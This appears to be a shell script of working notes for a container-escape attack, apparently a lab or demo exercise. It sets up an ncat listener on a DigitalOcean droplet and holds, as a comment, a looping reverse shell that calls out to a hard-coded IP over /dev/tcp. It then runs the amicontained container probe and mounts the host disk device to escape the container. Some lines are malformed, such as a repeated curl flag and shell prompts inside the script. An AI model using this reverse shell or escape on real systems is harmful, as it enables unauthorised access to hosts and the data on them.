#!/bin/bash

source ./00_common.sh

set -x

doctl compute droplet list

# Create command
# Setup ssh config
# On box
#   * apt install nmap
#   * ncat --listen 1234 --output $(mktemp /tmp/hack-XXXX.log)

# On exploit
# /bin/bash -c "while :; do nohup bash -i >& /dev/tcp/178.62.51.170/1234 0>&1; sleep 1; done"

# amicontained

python --version
__get() { local URL="$1"; [ ! -f "${URL}" ]&& curl -LO curl -LO ${URL}; };
$ __get https://github.com/genuinetools/amicontained/releases/download/v0.4.7/amicontained-linux-amd64
$ mv amicontained-linux-amd64 /usr/local/bin/amicontained
$ export AMICONTAINED_SHA256="4e32545f68f25bcbcd4cce82743e916a054e1686df44fab68420fc9f94f80b21"
$ echo "${AMICONTAINED_SHA256}  /usr/local/bin/amicontained" | sha256sum -c -
$ chmod a+x "/usr/local/bin/amicontained"
$ amicontained

# Get out of the container

$ ls /dev
$ df -h
$ mkdir -p /tmp/host
$ mount /dev/dm-0 /tmp/host

$ apt-get install sudo